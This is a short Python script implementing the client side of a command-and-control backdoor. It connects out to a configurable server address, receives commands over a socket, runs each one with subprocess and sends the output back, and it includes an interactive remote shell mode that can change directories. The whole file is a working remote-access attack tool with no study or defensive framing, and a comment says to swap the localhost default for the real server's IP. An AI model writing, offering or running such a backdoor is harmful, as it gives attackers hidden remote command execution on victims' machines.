import socket
import subprocess
import os
import sys

def execute_command(command):
    """Execute a command on the client system."""
    try:
        result = subprocess.getoutput(command)
        return result
    except Exception as e:
        return f"Error executing command: {e}"

def client_loop(server_ip, server_port):
    """Main loop for the client to communicate with the C2 server."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print("[*] Connected to the C2 server.")

    while True:
        command = client.recv(1024).decode().strip()
        if command.lower() == "exit":
            print("[*] Disconnecting from the server.")
            break

        elif command.lower().startswith("shell -d"):
            # Start a shell in the specified directory
            path = command.split()[-1] if len(command.split()) > 2 else "C:\\"
            if os.path.isdir(path):
                os.chdir(path)
                client.send(f"Changed directory to {path}\n".encode())
                while True:
                    client.send(f"{os.getcwd()}$ ".encode())
                    shell_command = client.recv(1024).decode().strip()
                    if shell_command.lower() == "exit":
                        break
                    result = subprocess.getoutput(shell_command)
                    client.send(result.encode())
            else:
                client.send(b"Invalid directory.\n")

        else:
            result = execute_command(command)
            client.send(result.encode())

    client.close()

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"  # Change this to the server's IP address
    SERVER_PORT = 9999
    client_loop(SERVER_IP, SERVER_PORT)
